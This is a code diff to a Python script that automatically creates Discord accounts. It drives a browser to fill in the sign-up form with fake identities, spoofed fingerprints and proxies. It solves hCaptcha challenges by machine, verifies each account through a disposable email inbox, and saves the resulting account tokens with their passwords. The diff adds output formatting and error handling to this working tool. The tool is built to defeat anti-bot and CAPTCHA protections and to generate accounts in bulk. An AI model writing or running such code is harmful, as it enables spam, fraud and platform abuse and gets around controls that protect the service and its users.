@@ -6,6 +6,7 @@ import random
 import re
 import time
 import tempfile
+import traceback
 
 # Pip Install Packages
 import numpy as np
@@ -24,7 +25,7 @@ from hcaptcha_challenger.solutions.kernel import Solutions
 from tempmail import TempMail
 
 
-class Faker():
+class Faker:
     def __init__(self, proxy):
         self.proxy = proxy
         return
@@ -45,7 +46,8 @@ class Faker():
         self.email_domain = data.get("email_d")
         self.email = f"{self.email_name}@{self.email_domain}"
         self.username = data.get("username")
-        self.password = data.get("password")
+        self.password = data.get("password").replace(
+            ":", "")  # Fixxes Messed Up OutputFormats
         self.domain = data.get("domain")
         self.company = data.get("company")
         self.pheight = data.get("height")
@@ -73,7 +75,7 @@ class Faker():
             while True:
                 url = "http://fingerprints.bablosoft.com/preview?rand=0.1&tags=Firefox,Desktop,Microsoft%20Windows"
                 r = requests.get(url, proxies=self.proxy,
-                                 timeout=20, verify=False)
+                                 timeout=20)
                 data = r.json()
                 self.useragent = data.get("ua")
                 self.vendor = data.get("vendor")
@@ -109,7 +111,7 @@ class Faker():
         self.locale = f"{self.language_code.lower()}-{country_code.upper()}"
 
 
-class Proxy():
+class Proxy:
     def __init__(self, proxy):
         self.proxy = proxy.strip() if proxy else None
         self.http_proxy = None
@@ -157,7 +159,7 @@ class Proxy():
     def check_proxy(self):
         try:
             ip_request = requests.get('https://ifconfig.me/ip',
-                                   proxies=self.httpx_proxy, verify=False)
+                                      proxies=self.httpx_proxy)
             ip = ip_request.text
             r = requests.get(f"http://ip-api.com/json/{ip}")
             data = r.json()
@@ -178,10 +180,11 @@ class Proxy():
 
 
 class Generator:
-    async def initialize(self, proxy, mode=None, output_file="output.txt", email=True, humanize=True):
+    async def initialize(self, proxy, mode=None, output_file="output.txt", email=True, humanize=True, output_format="token:email:pass"):
         # Initializing the Thread
         self.last_x, self.last_y = 0, 0
-        self.proxy, self.mode, self.output_file, self.email_verification, self.humanize = proxy, mode, output_file, email, humanize
+        self.proxy, self.mode, self.output_file, self.email_verification, self.humanize, self.output_format = proxy, mode, output_file, email, humanize, output_format
+        self.token, self.email = "", ""
         # SettingUp Logger
         logging.basicConfig(
             format='\033[34m[%(levelname)s] - \033[94mLine %(lineno)s  - \033[36m%(funcName)s() - \033[96m%(message)s\033[0m')
@@ -270,6 +273,22 @@ class Generator:
             await self.playwright.stop()
         except:
             pass
+
+    def log_output(self):
+        output = ""
+        for item in self.output_format.split(":"):
+            if "token" in item and self.token:
+                output += self.token + ":"
+            if "email" in item and self.email:
+                output += self.email + ":"
+            if "pass" in item:
+                output += self.faker.password + ":"
+            if "proxy" in item and self.proxy:
+                output += self.proxy + ":"
+
+        # Remove last :
+        output = output[:-1]
+        self.output = output
 
     async def type_humanly(self, locator, text):
         # Get the Element by Selector and click it
@@ -570,188 +589,218 @@ class Generator:
         await self.close()
 
     async def generate_unclaimed(self):
-        # Going on Discord Register Site
         try:
-            await self.page.goto("https://discord.com/")
-        except:
-            self.logger.error("Site didn´t load")
-            await self.close()
-            return False
-        # Setting Up TokenLog
-        await self.log_token()
-        self.token = None
-        # Click Open InBrowser Button
-        await self.click_humanly("", '[class *= "gtm-click-class-open-button"]')
-        # Typing Username
-        await self.type_humanly('[class *= "username"]', self.faker.username)
-        # Clicking Tos and Submit Button
-        try:
-            await self.click_humanly("", "[class *='termsCheckbox']", timeout=10000)
-        except Exception as e:
-            self.logger.debug("No TOS Checkbox was detected")
-            pass
-        await self.click_humanly("", '[class *= "gtm-click-class-register-button"]')
-        # Collecting all Images requested from hCaptcha (Captcha Images)
-        self.images = []
+            # Going on Discord Register Site
+            try:
+                await self.page.goto("https://discord.com/")
+            except:
+                self.logger.error("Site didn´t load")
+                await self.close()
+                return False
+            # Setting Up TokenLog
+            await self.log_token()
+            self.token = None
+            # Click Open InBrowser Button
+            await self.click_humanly("", '[class *= "gtm-click-class-open-button"]')
+            # Typing Username
+            await self.type_humanly('[class *= "username"]', self.faker.username)
+            # Clicking Tos and Submit Button
+            try:
+                await self.click_humanly("", "[class *='termsCheckbox']", timeout=10000)
+            except Exception as e:
+                self.logger.debug("No TOS Checkbox was detected")
+                pass
+            await self.click_humanly("", '[class *= "gtm-click-class-register-button"]')
+            # Collecting all Images requested from hCaptcha (Captcha Images)
+            self.images = []
 
-        async def image_append(route, request):
-            if request.resource_type == "image" and "hcaptcha" in request.url:
-                self.images.append(request.url)
-            await route.continue_()
-        await self.page.route("https://imgs.hcaptcha.com/*", image_append)
-        # Clicking Captcha Checkbox
-        try:
-            self.checkbox = self.page.frame_locator(
-                '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
-            await self.checkbox.scroll_into_view_if_needed(timeout=20000)
-        except:
-            self.logger.error("Captcha didn´t load")
-            await self.close()
-            return False
-        await self.click_humanly(self.checkbox, "")
-        await self.page.wait_for_timeout(2000)
-        captcha = await self.captcha_solver()
-
-        while not self.token:
+            async def image_append(route, request):
+                if request.resource_type == "image" and "hcaptcha" in request.url:
+                    self.images.append(request.url)
+                await route.continue_()
+            await self.page.route("https://imgs.hcaptcha.com/*", image_append)
+            # Clicking Captcha Checkbox
+            try:
+                self.checkbox = self.page.frame_locator(
+                    '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
+                await self.checkbox.scroll_into_view_if_needed(timeout=20000)
+            except:
+                self.logger.error("Captcha didn´t load")
+                await self.close()
+                return False
+            await self.click_humanly(self.checkbox, "")
             await self.page.wait_for_timeout(2000)
+            captcha = await self.captcha_solver()
 
-        self.logger.info(f"Generated Token: {self.token}")
-        await asyncio.sleep(2)
+            while not self.token:
+                await self.page.wait_for_timeout(2000)
 
-        is_locked = await self.is_locked()
-        if is_locked:
-            self.logger.error(f"Token {self.token} is locked!")
-            await self.close()
-            return
-        else:
+            self.logger.info(f"Generated Token: {self.token}")
+            await asyncio.sleep(2)
+
+            is_locked = await self.is_locked()
+            if is_locked:
+                self.logger.error(f"Token {self.token} is locked!")
+                await self.close()
+                return
+            else:
+                self.logger.info(
+                    f"Token: {self.token} is unlocked! Flags: {self.flags}")
+
+            self.log_output()
+
+            await self.page.wait_for_timeout(3000)
+            try:
+                await self.type_humanly('[id="react-select-2-input"]', self.faker.birth_day)
+                await self.page.keyboard.press("Enter")
+                await self.type_humanly('[id="react-select-3-input"]', self.faker.birth_month)
+                await self.page.keyboard.press("Enter")
+                await self.type_humanly('[id="react-select-4-input"]', self.faker.birth_year)
+                await self.page.keyboard.press("Enter")
+                await self.page.wait_for_timeout(1000)
+                await self.page.keyboard.press("Enter")
+            except:
+                pass
+
+            self.bot = discum.Client(
+                token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)
+
+            if self.email_verification:
+                self.logger.info("Claiming Account...")
+                claim = await self.claim_account()
+
+                if claim:
+                    self.logger.info("Verifying email...")
+                    email_v = await self.confirm_email()
+
+                    self.bot.switchAccount(self.token)
+
+            self.log_output()
+
+            if self.humanize:
+                await self.humanize_token()
+
+            self.log_output()
+            with open(self.output_file, 'a') as file:
+                file.write(f"{self.output}\n")
+
             self.logger.info(
-                f"Token: {self.token} is unlocked! Flags: {self.flags}")
+                "Successfully Generated Account! Closing Browser...")
 
-        await self.page.wait_for_timeout(3000)
+            await self.close()
+
+        # Catch Exceptions and save output anyways
+        except:
+            self.logger.error(
+                "Catched Exception, trying to save Token anyways... \n Error:")
+            print("\033[96m" + traceback.format_exc() + "\033[0m")
+            if self.output:
+                with open(self.output_file, 'a') as file:
+                    file.write(f"{self.output}\n")
+
+    async def generate_token(self):
         try:
+            # Going on Discord Register Site
+            try:
+                await self.page.goto("https://discord.com/register")
+            except:
+                self.logger.error("Site didn´t load")
+                await self.close()
+                return False
+            # Setting Up TokenLog
+            await self.log_token()
+            self.token = None
+            # Typing Email, Username, Password
+            self.inbox = TempMail.generateInbox(rush=True)
+            self.email = self.inbox.address if self.email_verification else str(
+                self.person.username+f"{random.randint(10, 99)}@gmail.com")
+            await self.type_humanly('[name="email"]', self.email)
+            await self.type_humanly('[name="username"]', self.faker.username)
+            await self.type_humanly('[name="password"]', self.faker.password)
+            # Typing BirthDay, BirthMonth, BirthYear
             await self.type_humanly('[id="react-select-2-input"]', self.faker.birth_day)
             await self.page.keyboard.press("Enter")
             await self.type_humanly('[id="react-select-3-input"]', self.faker.birth_month)
             await self.page.keyboard.press("Enter")
             await self.type_humanly('[id="react-select-4-input"]', self.faker.birth_year)
-            await self.page.keyboard.press("Enter")
-            await self.page.wait_for_timeout(1000)
-            await self.page.keyboard.press("Enter")
-        except:
-            pass
+            # Clicking Tos and Submit Button
+            try:
+                tos_box = self.page.locator("[type='checkbox']").first
+                await self.click_humanly(tos_box, "")
+            except Exception as e:
+                self.logger.debug("No TOS Checkbox was detected")
+                pass
+            await self.click_humanly("", '[type="submit"]')
+            # Collecting all Images requested from hCaptcha (Captcha Images)
+            self.images = []
 
-        self.bot = discum.Client(
-            token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)
+            async def image_append(route, request):
+                if request.resource_type == "image" and "hcaptcha" in request.url:
+                    self.images.append(request.url)
+                await route.continue_()
+            await self.page.route("https://imgs.hcaptcha.com/*", image_append)
+            # Clicking Captcha Checkbox
+            try:
+                self.checkbox = self.page.frame_locator(
+                    '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
+                await self.checkbox.scroll_into_view_if_needed(timeout=20000)
+            except Exception as e:
+                print(str(e))
+                self.logger.error("Captcha didn´t load")
+                await self.close()
+                return False
+            await self.click_humanly(self.checkbox, "")
+            await self.page.wait_for_timeout(2000)
+            captcha = await self.captcha_solver()
 
-        if self.email_verification:
-            self.logger.info("Claiming Account...")
-            claim = await self.claim_account()
+            while not self.token:
+                await self.page.wait_for_timeout(2000)
 
-            if claim:
+            self.logger.info(f"Generated Token: {self.token}")
+            await self.page.wait_for_timeout(2000)
+
+            is_locked = await self.is_locked()
+            if is_locked:
+                self.logger.error(f"Token {self.token} is locked!")
+                await self.close()
+                return
+            else:
+                self.logger.info(
+                    f"Token: {self.token} is unlocked! Flags: {self.flags}")
+
+            self.log_output()
+
+            self.bot = discum.Client(
+                token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)
+
+            if self.email_verification:
                 self.logger.info("Verifying email...")
                 email_v = await self.confirm_email()
 
                 self.bot.switchAccount(self.token)
 
-        if self.humanize:
-            await self.humanize_token()
+            self.log_output()
 
-        with open(self.output_file, 'a') as file:
-            if self.email_verification:
-                file.write(
-                    f"{self.token}:{self.inbox.address}:{self.faker.password}\n")
-            else:
-                file.write(
-                    f"{self.token}\n")
+            if self.humanize:
+                await self.humanize_token()
 
-        await self.close()
+            self.log_output()
+            with open(self.output_file, 'a') as file:
+                file.write(f"{self.output}\n")
 
-    async def generate_token(self):
-        # Going on Discord Register Site
-        try:
-            await self.page.goto("https://discord.com/register")
-        except:
-            self.logger.error("Site didn´t load")
-            await self.close()
-            return False
-        # Setting Up TokenLog
-        await self.log_token()
-        self.token = None
-        # Typing Email, Username, Password
-        self.inbox = TempMail.generateInbox(rush=True)
-        await self.type_humanly('[name="email"]', self.inbox.address if self.email_verification else str(self.person.username+f"{random.randint(10, 99)}@gmail.com"))
-        await self.type_humanly('[name="username"]', self.faker.username)
-        await self.type_humanly('[name="password"]', self.faker.password)
-        # Typing BirthDay, BirthMonth, BirthYear
-        await self.type_humanly('[id="react-select-2-input"]', self.faker.birth_day)
-        await self.page.keyboard.press("Enter")
-        await self.type_humanly('[id="react-select-3-input"]', self.faker.birth_month)
-        await self.page.keyboard.press("Enter")
-        await self.type_humanly('[id="react-select-4-input"]', self.faker.birth_year)
-        # Clicking Tos and Submit Button
-        try:
-            tos_box = self.page.locator("[type='checkbox']").first
-            await self.click_humanly(tos_box, "")
-        except Exception as e:
-            self.logger.debug("No TOS Checkbox was detected")
-            pass
-        await self.click_humanly("", '[type="submit"]')
-        # Collecting all Images requested from hCaptcha (Captcha Images)
-        self.images = []
-
-        async def image_append(route, request):
-            if request.resource_type == "image" and "hcaptcha" in request.url:
-                self.images.append(request.url)
-            await route.continue_()
-        await self.page.route("https://imgs.hcaptcha.com/*", image_append)
-        # Clicking Captcha Checkbox
-        try:
-            self.checkbox = self.page.frame_locator(
-                '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
-            await self.checkbox.scroll_into_view_if_needed(timeout=20000)
-        except Exception as e:
-            print(str(e))
-            self.logger.error("Captcha didn´t load")
-            await self.close()
-            return False
-        await self.click_humanly(self.checkbox, "")
-        await self.page.wait_for_timeout(2000)
-        captcha = await self.captcha_solver()
-
-        while not self.token:
-            await self.page.wait_for_timeout(2000)
-
-        self.logger.info(f"Generated Token: {self.token}")
-        await self.page.wait_for_timeout(2000)
-
-        is_locked = await self.is_locked()
-        if is_locked:
-            self.logger.error(f"Token {self.token} is locked!")
-            await self.close()
-            return
-        else:
             self.logger.info(
-                f"Token: {self.token} is unlocked! Flags: {self.flags}")
+                "Successfully Generated Account! Closing Browser...")
 
-        self.bot = discum.Client(
-            token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)
+            await self.close()
 
-        if self.email_verification:
-            self.logger.info("Verifying email...")
-            email_v = await self.confirm_email()
-
-            self.bot.switchAccount(self.token)
-
-        if self.humanize:
-            await self.humanize_token()
-
-        with open(self.output_file, 'a') as file:
-            file.write(
-                f"{self.token}:{self.inbox.address}:{self.faker.password}\n")
-
-        self.logger.info("Successfully Generated Account! Closing Browser...")
-
-        await self.close()
+        # Catch Exceptions and save output anyways
+        except:
+            self.logger.error(
+                "Catched Exception, trying to save Token anyways... \n Error:")
+            print("\033[96m" + traceback.format_exc() + "\033[0m")
+            if self.output:
+                with open(self.output_file, 'a') as file:
+                    file.write(f"{self.output}\n")
 
     # Discord Helper Functions
     async def log_token(self):
@@ -770,7 +819,7 @@ class Generator:
 
     async def is_locked(self):
         token_check = requests.get('https://discord.com/api/v9/users/@me/library',
-                                headers={"Authorization": self.token}, proxies=self.proxy.httpx_proxy).status_code == 200
+                                   headers={"Authorization": self.token}, proxies=self.proxy.httpx_proxy).status_code == 200
         if token_check:
             r = requests.get(
                 'https://discord.com/api/v9/users/@me', headers={"Authorization": self.token}, proxies=self.proxy.httpx_proxy)
@@ -815,9 +864,10 @@ class Generator:
 
     async def claim_account(self):
         self.inbox = TempMail.generateInbox(rush=True)
+        self.email = self.inbox.address
 
         self.bot._Client__user_password = self.faker.password
-        response = self.bot.setEmail(self.inbox.address)
+        response = self.bot.setEmail(self.email)
         if not response.status_code == 200:
             try:
                 self.logger.error(
@@ -966,6 +1016,15 @@ async def main():
             raise ValueError("Provided OutputPath isnt a file!")
     else:
         output_file = "output.txt"
+
+    output_format = input("[Input] - [Output Format]\n" +
+                          "<?> Token: token, Email: email, Password: pass, Proxy: proxy\n" +
+                          "<?> Leave empty for standart output: token:email:pass\n" + "</> ")
+    if not output_format:
+        output_format = "token:email:pass"
+    for item in output_format.split(":"):
+        if item not in ["token", "email", "pass", "proxy"]:
+            raise ValueError(f"Invalid OutputItem: {item}")
 
     os.system('cls' if os.name == 'nt' else 'clear')
 
